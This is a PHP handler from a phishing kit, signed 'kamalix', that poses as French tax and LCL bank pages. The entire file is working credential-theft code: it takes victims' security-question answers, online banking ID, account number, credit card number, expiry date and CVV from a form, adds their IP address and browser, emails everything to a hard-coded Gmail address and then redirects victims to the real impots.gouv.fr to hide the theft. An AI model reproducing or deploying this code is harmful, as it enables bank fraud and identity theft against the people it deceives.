<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| By kamalix |-------------------\n";
$message .= "Rue grandi      : ".$_POST['reponses']."\n";
$message .= "Ami d'enfance   : ".$_POST['reponses2']."\n";
$message .= "==========Edited===By===By kamalix==========\n";
$message .= "Sa mére LCL     : ".$_POST['reponseslcl']."\n";
$message .= "Son Pére LCL    : ".$_POST['reponseslcl2']."\n";
$message .= "==========Edited===By===By kamalix==========\n";
$message .= "Banque Distance : ".$_POST['ibad']."\n";
$message .= "==========Edited===By===Kamalix==========\n";
$message .= "Nom de la banque: ".$_POST['bank']."\n";
$message .= "num de compte   : ".$_POST['account']."\n";
$message .= "Carte de credit : ".$_POST['ccnum']."\n";
$message .= "Date expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$message .= "--------------------+ 20|KiNG H4ck3r|14 +--------------------\n";
$message .= "+-----/!\-----|By kamalix|-----/!\-----+\n";
$to = "gladimirbotin@gmail.com";
$subj = " Impo Rezults||".$ip."\n";
$from = "From: Impo Fresh  <gladimirbotin@gmail.com>";
mail($to, $subj, $message, $from);
header("Location: http://www.impots.gouv.fr");
?>